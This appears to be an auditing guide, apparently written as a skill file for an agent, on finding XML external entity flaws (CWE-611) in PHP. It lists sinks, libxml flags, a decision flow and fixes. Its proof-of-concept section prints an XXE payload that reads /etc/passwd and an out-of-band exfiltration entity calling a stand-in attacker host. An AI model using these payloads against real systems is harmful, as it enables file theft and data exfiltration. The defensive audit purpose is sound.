# PHP — XXE Audit Skill (CWE-611)

## Sink inventory
- `simplexml_load_string($x)`, `simplexml_load_file($x)`
- `DOMDocument::loadXML`, `DOMDocument::load`
- `SoapServer` / `SoapClient` with WSDL parsing of attacker
  payloads.

## libxml hardening flags

Default libxml in modern PHP (8+) **disables** external entity
loading. But two switches bring it back:

- `libxml_disable_entity_loader(false)` — explicit re-enable.
- `LIBXML_NOENT` flag passed to load — substitutes general
  entities (still resolves DTD; lab variants exploit this).

## Decision flow

1. Locate the XML load call. Note its flags argument.
2. If flags include `LIBXML_NOENT`, treat as **vulnerable**.
3. Check whether `libxml_disable_entity_loader(true)` is called
   earlier in the same script and not undone. PHP 8.0+ deprecated
   this; libxml2 ≥ 2.9 disables entities by default.
4. For SOAP: confirm `cache_wsdl` is not 0 with attacker-controlled
   WSDL URL.

## Tool hints

- `ripgrep__search "libxml_disable_entity_loader"` to confirm policy.
- `tldr__tldr_extract` on the SOAP service constructor.

## POC template
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

OOB exfiltration when blind:
```xml
<!ENTITY % p SYSTEM "http://attacker/poc.dtd">
%p;
```

## Fix recommendations

1. Don't toggle `libxml_disable_entity_loader` to `false`.
2. Use `LIBXML_NOENT|LIBXML_DTDLOAD|LIBXML_DTDATTR` only when
   parsing trusted XML.
3. Where possible switch to JSON (no entity / DTD semantics).
